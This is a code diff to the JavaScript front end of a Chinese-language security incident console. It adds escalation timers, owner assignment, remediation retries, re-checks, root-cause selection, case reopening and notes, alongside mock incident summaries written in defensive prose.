+          items: its.map((x) => { const s2 = stOf(x); const sl = slaOf(x); return { n: x.n, st: s2, sub: x.id + ' · ' + s2 + (sl ? ' · ' + sl[1] : ''), sc: s2 === '待研判' ? 'hd-red' : 'hd-mut', tm: x.tm, c: 'hu-it ' + LB[x.lv] + (x.id === incId ? ' on' : ''), t: ev(() => S({ huI: x.id, huN: '', huX: 0, huNo: false, huAll: 0, huH: '' })) }; }) }; });
       const hostsAll = []; INC.forEach((x) => { if (hostsAll.indexOf(x.h) < 0) hostsAll.push(x.h); });
       ls.railH = hostsAll.map((h2) => { const its = INC.filter((x) => x.h === h2); const pn = its.filter((x) => stOf(x) === '待研判').length; const cur = its.some((x) => x.id === incId);
         return { k: pn || '', tt: h2 + ' · ' + (pn ? pn + ' 个待研判' : '没有待研判'), c: 'hu-qd' + (pn ? ' p' : ' z') + (cur ? ' on' : ''), t: ev(() => S({ huQ: true, huI: (its.find((x) => stOf(x) === '待研判') || its[0]).id, huN: '', huH: '' })) }; });
-      const s0 = stOf(inc); const alP = handled(inc) ? 0 : inc.al.length;
-      ls.inc = { id: inc.id, n: inc.n, lv: inc.lv, lvC: inc.lv === '紧急' ? 'kc-tag err' : inc.lv === '可疑' ? 'kc-tag warn' : 'kc-tag info', entry: inc.entry, host: hn, ip: hh.ip || '', first: inc.first, last: inc.last, st: s0, stC: STC[s0] || 'kc-tag mut', pend: alP || '',
+      const s0 = stOf(inc); const alP = s0 === '待研判' ? inc.al.length : 0; const slI = slaOf(inc);
+      ls.inc = { id: inc.id, n: inc.n, lv: inc.lv, lvC: inc.lv === '紧急' ? 'kc-tag err' : inc.lv === '可疑' ? 'kc-tag warn' : 'kc-tag info', entry: inc.entry, host: hn, ip: hh.ip || '', first: inc.first, last: inc.last, st: s0, stC: STC[s0] || 'kc-tag mut', pend: alP || '', sla: slI ? slI[0] + '时限：' + slI[1] : '', slaC: 'hu-sla' + (slI && slI[2] ? ' r' : ''), slaAl: !!(slI && slI[2]), slaAlT: '响应已超时 12 分钟，已按升级规则短信通知安全负责人 张敏（紧急事件 30 分钟未研判即升级）。' + (own[inc.id] ? '' : '请先指定负责人。'),
         hostGo: GO('SecHostDetail', {}, hn) };
+      { const ow = own[inc.id] || ''; const oo = st.huOo === inc.id;
+        ls.ownN = ow || '未分配'; ls.ownC = ow ? 'kc-dd hu-ownb' : 'kc-dd hu-ownb no'; ls.ownW = oo ? 'dd-w on' : 'dd-w'; ls.ownOn = oo;
+        ls.ownT = ev(() => S({ huOo: oo ? '' : inc.id })); ls.ownX = ev(() => S({ huOo: '' }));
+        ls.owns = ['wangqi（我）', '张敏', '李响', '未分配'].map((n) => { const v = n === '未分配' ? '' : n; return { n, c: v === ow ? 'on' : '', t: ev(() => { S({ huOo: '', huOwn: Object.assign({}, st.huOwn || {}, { [inc.id]: v }) }); toast(v ? inc.id + ' 已指派给 ' + n + '，已发送通知' : '已取消指派', v ? 'ok' : 'info'); }) }; }); }
       ls.ai = { t: inc.ai[0], v: inc.ai[1], vc: inc.ai[1] === '需要人工确认' ? 'kc-tag warn' : 'kc-tag err', conf: inc.ai[2], s: inc.ai[3], pts: inc.ai[4].map((t) => ({ t })) };
       ls.aiMore = !!st.huAi; ls.aiTN = st.huAi ? '收起' : '更多研判'; ls.aiC = 'hu-chv' + (st.huAi ? ' up' : ''); ls.aiT = ev(() => S({ huAi: !st.huAi }));
       const arOn = st.huAr === undefined ? true : !!st.huAr; ls.arOn = arOn; ls.arE = arOn ? 'true' : 'false'; ls.arC = 'hu-chv' + (arOn ? ' up' : ''); ls.arT = ev(() => S({ huAr: !arOn }));
@@ -2399,10 +2453,12 @@ class Component extends DCLogic {
       ls.trN = procs.length + ' 个进程 · 点一行查看节点证据';
       ls.tree = ord.map((id) => { const p = PRC[id]; const k = alOf(id).length; return { n: p[0], pid: p[1], cmd: p[4], al: k ? k + ' 条告警' : '', alC: handled(inc) ? 'kc-tag info' : 'kc-tag err', st: 'padding-left:' + (12 + depth(id) * 24) + 'px', c: 'hu-trr' + (id === selN ? ' on' : ''), t: ev(() => S({ huN: id })) }; });
       ls.tlS = inc.al.length + ' 条 · ' + inc.first + ' — ' + inc.last;
-      const aSt = handled(inc) ? (stOf(inc) === '处置中' ? '处置中' : '已处理') : '待处理';
+      const aSt = s0 === '待研判' ? '待研判' : s0 === '已关闭 · 误报' ? '已忽略' : '已确认';
       const nm = (id) => { const d = ND(id); return d[0] === 'proc' ? d[1] + ' · ' + d[2].replace('PID ', '') : d[1]; };
-      ls.alerts = inc.al.map(([aid, tm, n, stg, ak, d, nid]) => ({ tm, n, stg, ak, d, pr: nm(nid), st: aSt, sc: aSt === '待处理' ? 'hu-ast r' : 'hu-ast', dc: aSt === '待处理' ? 'hu-ld r' : 'hu-ld b', c: 'hu-tr1' + (nid === selN ? ' on' : '') + fc(aid), he: HV('a:' + aid), t: ev(() => S({ huN: nid })) }));
+      ls.alerts = inc.al.map(([aid, tm, n, stg, ak, d, nid]) => ({ tm, n, stg, ak, d, pr: nm(nid), st: aSt, sc: aSt === '待研判' ? 'hu-ast r' : 'hu-ast', dc: aSt === '待研判' ? 'hu-ld r' : 'hu-ld b', c: 'hu-tr1' + (nid === selN ? ' on' : '') + fc(aid), he: HV('a:' + aid), t: ev(() => S({ huN: nid })) }));
       const AIX = {
+        'INC-3206': ['攻击者暴力破解 root 后登录，并执行了预先放在 /tmp 下的程序，意图植入后门。', '以 root 权限执行，若 /tmp/.x 已运行，主机上的所有数据都可能被读取。', ['g1', 'g2'],
+          ['确认 /tmp/.x 是否已建立外联', '检查 root 的 crontab 和 authorized_keys', '重置 root 密码并关闭 root 远程登录']],
         'INC-3201': ['攻击者利用上传接口植入 WebShell，获取 www-data 执行权限后拉取远控载荷 kworkerd，并通过 cron 每 5 分钟拉起实现持久化，最终经 C2 通道外传站点数据。',
           '已确认 38.2MB 数据外传，涉及 /var/www 目录；当前权限为 www-data，尚未发现提权迹象。同网段 2 台主机曾访问 185.66.21.9，存在横向风险。', ['a2', 'a5', 'a6'],
           ['回溯 nginx access.log 中 /upload 请求的来源 IP 与会话', '检查 /var/www 下其他新增或修改的 .php 文件', '全网检索 kworkerd 哈希与 185.66.21.9 的访问记录']],
@@ -2425,7 +2481,7 @@ class Component extends DCLogic {
         next: X2[3].map((t) => ({ t })) });
 
       const d = ND(selN); const kSel = alOf(selN);
-      const nd = { n: d[1], s: d[2], kind: { ip: '网络地址', evt: '入口事件', host: '主机', proc: '进程', file: '文件' }[d[0]], hasSt: true, st: kSel.length ? aSt : '关联证据', stC: kSel.length ? (aSt === '待处理' ? 'kc-tag err' : 'kc-tag info') : 'kc-tag mut', hasCmd: false, cmd: '', cmdK: '', canPi: false, piGo: ev(() => {}) };
+      const nd = { n: d[1], s: d[2], kind: { ip: '网络地址', evt: '入口事件', host: '主机', proc: '进程', file: '文件' }[d[0]], hasSt: true, st: kSel.length ? aSt : '关联证据', stC: kSel.length ? (aSt === '待研判' ? 'kc-tag err' : 'kc-tag info') : 'kc-tag mut', hasCmd: false, cmd: '', cmdK: '', canPi: false, piGo: ev(() => {}) };
       if (d[0] === 'proc') { const p = PRC[selN]; const par = PRC[p[2]];
         nd.kv = [['PID', p[1], 'pi-mono'], ['父进程', par ? par[0] + ' · ' + par[1] : '—', 'pi-mono'], ['用户', p[3], 'pi-mono'], ['SHA256', p[6], 'pi-mono'], ['签名', p[5], p[5] === '无签名' ? 'hd-red' : '']].map(([k, v, c]) => ({ k, v: String(v), c: c || '' }));
         nd.hasCmd = true; nd.cmd = p[4]; nd.cmdK = '命令行'; nd.canPi = true; nd.piGo = piGo(inc, selN); }
@@ -2434,7 +2490,7 @@ class Component extends DCLogic {
       ls.copy = ev(() => toast('已复制'));
       ls.keys = kSel.map((y) => ({ n: y[2], tm: y[1], d: y[5] })); ls.keyN = kSel.length || ''; ls.keyNone = !kSel.length;
       const all = !!st.huAll; const relL = inc.al;
-      ls.rel = (all ? relL : relL.slice(0, 3)).map((y) => ({ n: y[2], stg: y[3], st: aSt, c: 'hu-rl' + (y[6] === selN ? ' on' : '') + (aSt === '待处理' ? ' r' : '') + fc(y[0]), he: HV('a:' + y[0]), t: ev(() => S({ huN: y[6] })) }));
+      ls.rel = (all ? relL : relL.slice(0, 3)).map((y) => ({ n: y[2], stg: y[3], st: aSt, c: 'hu-rl' + (y[6] === selN ? ' on' : '') + (aSt === '待研判' ? ' r' : '') + fc(y[0]), he: HV('a:' + y[0]), t: ev(() => S({ huN: y[6] })) }));
       ls.relN = relL.length; ls.relMoreOn = relL.length > 3; ls.relAllN = all ? '收起' : '查看全部 ' + relL.length; ls.relAll = ev(() => S({ huAll: !all }));
       // plan
       const addK = (st.huAdd || {})[incId] || [];
@@ -2442,8 +2498,8 @@ class Component extends DCLogic {
       const addItems = addK.map((k) => { const [n, tg] = k.split('|'); return { k, n, tg, w: '', added: true }; }).filter((x) => !baseItems.some((b) => b.k === x.k));
       const items = baseItems.concat(addItems);
       const offK = (st.huOff || {})[incId] || {};
-      const isDone = run[incId] === 'done' || inc.done; const isIng = run[incId] === 'ing' || (inc.run && !run[incId]);
-      const vd = vd0[incId] || (inc.done || inc.run ? 'real' : '');
+      const recNow = RE(inc); const chkS = chk[incId] || ''; const roV = (st.huRo || {})[incId] || ''; const isClosed = s0.indexOf('已关闭') === 0; const isVer = s0 === '待验证'; const isIng = recNow.some((y) => y.r === 'ing'); const isDone = !isIng && (recNow.length > 0 || isClosed); const failL = recNow.filter((y) => y.r === 'fail');
+      const vd = vd0[incId] || (inc.vdR ? 'real' : '');
       const selItems = items.filter((x) => !offK[x.k]);
       ls.planN = handled(inc) ? '' : selItems.length;
       ls.plan = { ai: inc.plan[0] };
@@ -2452,16 +2508,48 @@ class Component extends DCLogic {
       ls.vds = [['real', '确认为真实攻击', '与 AI 结论一致，确认入侵'], ['fp', '误报', '关闭事件，不执行处置']].map(([k, n, d2]) => ({ n, d: d2, a: vd === k ? 'true' : 'false', c: 'hu-v' + (vd === k ? ' on' : '') + (isDone || isIng ? ' dis' : ''), t: isDone || isIng ? ev(() => {}) : ev(() => S({ huVd: Object.assign({}, vd0, { [incId]: k }) })) }));
       ls.itemsOn = vd !== 'fp';
       ls.selN = selItems.length;
-      ls.items = items.map((x) => { const on = !offK[x.k]; const dn = isDone ? (on ? '已完成' : '未执行') : isIng && on ? '执行中…' : '';
+      ls.items = items.map((x) => { const on = !offK[x.k]; const rr = recNow.find((y) => y.n === x.n && y.tg === x.tg); const dn = rr ? (rr.r === 'ok' ? '已完成' : rr.r === 'fail' ? '失败' : '执行中…') : isDone || isIng ? '未执行' : '';
         return { n: x.n, tg: x.tg, w: x.w, added: x.added && !dn, done: dn, a: on ? 'true' : 'false', c: 'hu-pi1' + (on ? ' on' : '') + (isDone || isIng ? ' dis' : ''),
           t: isDone || isIng ? ev(() => {}) : ev(() => S({ huOff: Object.assign({}, st.huOff || {}, { [incId]: Object.assign({}, offK, { [x.k]: !offK[x.k] }) }) })) }; });
-      const recL = (run[incId] === 'done' ? (vd === 'fp' ? [['标记为误报并关闭事件', '刚刚']] : selItems.map((x) => [x.n + ' · ' + x.tg, '刚刚'])) : run[incId] === 'ing' ? selItems.map((x) => [x.n + ' · ' + x.tg, '执行中']) : inc.recs);
-      ls.recs = recL.map(([n, tm]) => ({ n, tm, c: tm === '执行中' ? 'hu-rd b' : 'hu-rd g' })); ls.recNone = !recL.length;
-      const can = !!vd && !isDone && !isIng && (vd === 'fp' || selItems.length > 0);
-      ls.exN = isDone ? '已完成' : isIng ? '执行中…' : vd === 'fp' ? '标记误报并关闭' : '执行所选（' + selItems.length + '）';
+      const rootV = (st.huRoot || {})[incId] || ''; const RW = { ok: '成功', fail: '失败', ing: '执行中' };
+      const recL = (hist[incId] || []).concat(recNow).concat(chkS === 'ok' ? [{ n: '复检通过', tg: '', r: 'ok', tm: '刚刚', why: '未再发现恶意进程、外联和持久化项' }] : chkS === 'ing' ? [{ n: '复检', tg: '', r: 'ing', tm: '执行中' }] : []).concat(isClosed && vd !== 'fp' ? [{ n: '事件结案', tg: '', r: 'ok', tm: '刚刚', why: rootV ? '根因：' + rootV : '' }] : []);
+      ls.recs = recL.map((y) => ({ n: y.n + (y.tg ? ' · ' + y.tg : ''), tm: y.r === 'ing' ? (y.tm === '重试中' ? '重试中' : '执行中') : y.tm + ' · ' + RW[y.r], c: 'hu-rd ' + (y.r === 'ing' ? 'b' : y.r === 'fail' ? 'r' : 'g'),
+        why: y.why || '', hasWhy: !!y.why, wc: y.r === 'fail' ? 'hu-rw r' : 'hu-rw', re: y.r === 'fail' && !y.old, reN: y.fix ? '执行「' + y.fix[0] + '」' : '重试',
+        reGo: ev(() => { const k = incId + '|' + y.n; S({ huRe: Object.assign({}, reT, { [k]: 'ing' }) }); setTimeout(() => { this.setState({ huRe: Object.assign({}, this.state.huRe || {}, { [k]: 'ok' }) }); toast((y.fix ? '「' + y.fix[0] + '」执行成功' : y.n + ' 重试成功') + (failL.length <= 1 ? '，' + incId + ' 进入待验证' : '')); }, 1200); }) }));
+      ls.recNone = !recL.length;
+      ls.clOn = isVer || (isClosed && vd !== 'fp'); ls.clNeed = isVer && chkS === 'ok' && !rootV; ls.clS = isClosed ? '已结案' : '复检通过后结案';
+      ls.clChk = chkS === 'ok' || isClosed ? '已通过，未再发现恶意进程、外联和持久化项' : chkS === 'ing' ? '复检中…' : '还没有复检。复检会重新检查进程、外联、计划任务和登录凭据';
+      ls.roots = [['漏洞利用', '通过未修复的漏洞进入'], ['弱口令或凭据泄露', '账号密码被猜中或泄露'], ['配置不当', '端口、权限等开放过大'], ['暂未查明', '先结案，后续补充']]
+        .map(([n, d2]) => ({ n, d: d2, a: rootV === n ? 'true' : 'false', c: 'hu-v' + (rootV === n ? ' on' : '') + (isClosed ? ' dis' : ''), t: isClosed ? ev(() => {}) : ev(() => S({ huRoot: Object.assign({}, st.huRoot || {}, { [incId]: n }) })) }));
+      ls.roOn = isClosed && vd !== 'fp';
+      ls.ros = ['同一来源再次出现', '结案结论有误', '发现新的受影响主机'].map((n) => ({ n, c: roV === n ? 'sh-ro on' : 'sh-ro', a: roV === n ? 'true' : 'false', t: ev(() => S({ huRo: Object.assign({}, st.huRo || {}, { [incId]: n }) })) }));
+      { const nl = notes[incId] || []; ls.nts = nl.map(([who, tm, t]) => ({ who, tm, t })); ls.ntNone = !nl.length; ls.ntV = (st.huNv || {})[incId] || '';
+        ls.ntOn = (e) => S({ huNv: Object.assign({}, st.huNv || {}, { [incId]: e && e.target ? e.target.value : '' }) });
+        ls.ntAdd = ev(() => { const v = (ls.ntV || '').trim(); if (!v) { toast('先写点内容', 'info'); return; } S({ huNt: Object.assign({}, st.huNt || {}, { [incId]: nl.concat([['wangqi', '刚刚', v]]) }), huNv: Object.assign({}, st.huNv || {}, { [incId]: '' }) }); toast('备注已添加'); }); }
+      ls.clTip = '事件结案不等于漏洞已修复。根因是漏洞利用或配置不当时，请继续跟进修复。'; ls.clVul = rootV === '漏洞利用' || rootV === '配置不当';
+      ls.clVulN = rootV === '配置不当' ? '去基线检查' : '去漏洞管理'; ls.clVulGo = GO(rootV === '配置不当' ? 'SecBaseline' : 'SecVuln', { '主机': hn });
+      const can = isClosed ? !!roV && vd !== 'fp' : isVer ? (chkS === 'ok' ? !!rootV : chkS !== 'ing') : !!vd && !isDone && !isIng && (vd === 'fp' || selItems.length > 0);
+      ls.exN = isClosed ? (vd === 'fp' ? '已关闭' : '重新打开') : isVer ? (chkS === 'ok' ? '结案' : chkS === 'ing' ? '复检中…' : '发起复检') : isIng ? '执行中…' : failL.length ? '有 ' + failL.length + ' 项失败，重试后结案' : isDone ? '已完成' : vd === 'fp' ? '标记误报并关闭' : '执行所选（' + selItems.length + '）';
       ls.exC = 'kc-btn pri' + (can ? '' : ' hu-dis') + (vd === 'fp' && can ? ' hu-warn' : ''); ls.exDis = can ? 'false' : 'true';
-      ls.exGo = ev(() => { if (!vd) { toast('请先确认研判结论', 'info'); return; } if (!can) return;
-        S({ huRun: Object.assign({}, run, { [incId]: 'ing' }) }); setTimeout(() => { this.setState({ huRun: Object.assign({}, this.state.huRun || {}, { [incId]: 'done' }) }); toast(vd === 'fp' ? incId + ' 已标记为误报并关闭，包含的告警已同步为已忽略' : incId + ' 处置完成，攻击已遏制，包含的告警已同步为已处理' /* home160 */); }, 1600); });
+      ls.exGo = ev(() => {
+        if (isClosed) { if (vd === 'fp') return; if (!roV) { toast('请先选择重新打开的原因', 'info'); return; }
+          const old = recL.map((y) => Object.assign({}, y, { old: 1 })).concat([{ n: '重新打开', tg: '', r: 'ok', tm: '刚刚', why: '原因：' + roV, old: 1 }]);
+          const re2 = Object.assign({}, reT); Object.keys(re2).forEach((k) => { if (k.indexOf(incId + '|') === 0) delete re2[k]; });
+          S({ huHist: Object.assign({}, hist, { [incId]: old }), huRec: Object.assign({}, st.huRec || {}, { [incId]: [] }), huRun: Object.assign({}, run, { [incId]: '' }), huVd: Object.assign({}, vd0, { [incId]: 'real' }), huChk: Object.assign({}, chk, { [incId]: '' }), huRe: re2, huRo: Object.assign({}, st.huRo || {}, { [incId]: '' }), huRoot: Object.assign({}, st.huRoot || {}, { [incId]: '' }) });
+          toast(incId + ' 已重新打开，回到调查中，包含的告警保持「已确认」'); return; }
+        if (isVer && chkS !== 'ok') { if (chkS === 'ing') return; S({ huChk: Object.assign({}, chk, { [incId]: 'ing' }) });
+          setTimeout(() => { const st2 = this.state || {}; const f = RCF[incId]; const tried = (st2.huChkF || {})[incId];
+            if (f && !tried) { const base = ((st2.huRec || {})[incId] || inc.recs).concat([{ n: '复检未通过', tg: '', r: 'fail', tm: '刚刚', why: f[2], fix: [f[0], f[1]] }]);
+              this.setState({ huChk: Object.assign({}, st2.huChk || {}, { [incId]: '' }), huChkF: Object.assign({}, st2.huChkF || {}, { [incId]: 1 }), huRec: Object.assign({}, st2.huRec || {}, { [incId]: base }) }); toast('复检未通过，事件退回处置中：' + f[0], 'info'); }
+            else { this.setState({ huChk: Object.assign({}, st2.huChk || {}, { [incId]: 'ok' }) }); toast('复检通过，选择根因后即可结案'); } }, 1500); return; }
+        if (isVer) { if (!rootV) { toast('请先选择根因', 'info'); return; } S({ huRun: Object.assign({}, run, { [incId]: 'closed' }) }); toast(incId + ' 已结案，包含的告警保持「已确认」'); return; }
+        if (!vd) { toast('请先确认研判结论', 'info'); return; } if (!can) return;
+        const its = vd === 'fp' ? [{ n: '标记为误报并关闭事件', tg: '', r: 'ing', tm: '刚刚' }] : selItems.map((x) => ({ n: x.n, tg: x.tg, r: 'ing', tm: '刚刚' }));
+        S({ huRun: Object.assign({}, run, { [incId]: 'ing' }), huRec: Object.assign({}, st.huRec || {}, { [incId]: its }) });
+        setTimeout(() => { const fl = vd === 'fp' || (this.state.huHist || {})[incId] ? {} : FAIL[incId] || {}; const fin = its.map((y) => fl[y.n] ? Object.assign({}, y, { r: 'fail', why: fl[y.n] }) : Object.assign({}, y, { r: 'ok' }));
+          this.setState({ huRun: Object.assign({}, this.state.huRun || {}, { [incId]: 'done' }), huRec: Object.assign({}, this.state.huRec || {}, { [incId]: fin }) });
+          const fn = fin.filter((y) => y.r === 'fail').length;
+          toast(vd === 'fp' ? incId + ' 已标记为误报并关闭，包含的告警改为「已忽略」' : fn ? '执行完成：' + (fin.length - fn) + ' 项成功，' + fn + ' 项失败，查看原因后重试' : incId + ' 处置完成，进入待验证，发起复检后结案', fn ? 'info' : 'ok'); }, 1600); });
       // node ops
       ls.nopOn = !!st.huNo; ls.nopE = st.huNo ? 'true' : 'false'; ls.nopT = ev(() => S({ huNo: !st.huNo }));
       const isProc = d[0] === 'proc';
@@ -2644,7 +2732,7 @@ class Component extends DCLogic {
       ls.ptEv = ptab === '关联安全事件'; ls.ptTl = ptab === '行为时间线'; ls.ptAt = ptab === '进程属性';
       ls.piDescC = 'pi-cb hd-r2' + (inc ? ' on' : '') + (nDesc ? '' : ' dis'); ls.piDescA = inc ? 'true' : 'false'; ls.piDescT = ev(() => S({ hdPd: !inc }));
       const grp = {}; evs.forEach((e) => { const g = grp[e.en] || (grp[e.en] = { n: e.en, inc: e.inc, k: 0, t: '', prs: {}, lv: e.lv }); g.k++; if (e.t > g.t) g.t = e.t; g.prs[PM[e.pr].n] = 1; });
-      const IST = { 'INC-3201': '待研判', 'INC-3202': '待研判', 'INC-3198': '已遏制' };
+      const IST = { 'INC-3201': '待研判', 'INC-3202': '待研判', 'INC-3198': '待验证' };
       ls.piEvs = Object.keys(grp).map((k) => { const g = grp[k];
         return { n: g.n, k: g.k, t: '11-04 ' + g.t.slice(0, 5), pr: Object.keys(g.prs).join('、'), st: IST[g.inc] || '待研判', lc: LVC[g.lv] || 'kc-lv3', go: GO('SecHunt', { '事件': g.inc, '节点': selId }) }; });
       ls.piEvHas = ls.piEvs.length > 0; ls.piEvNone = !ls.piEvs.length;
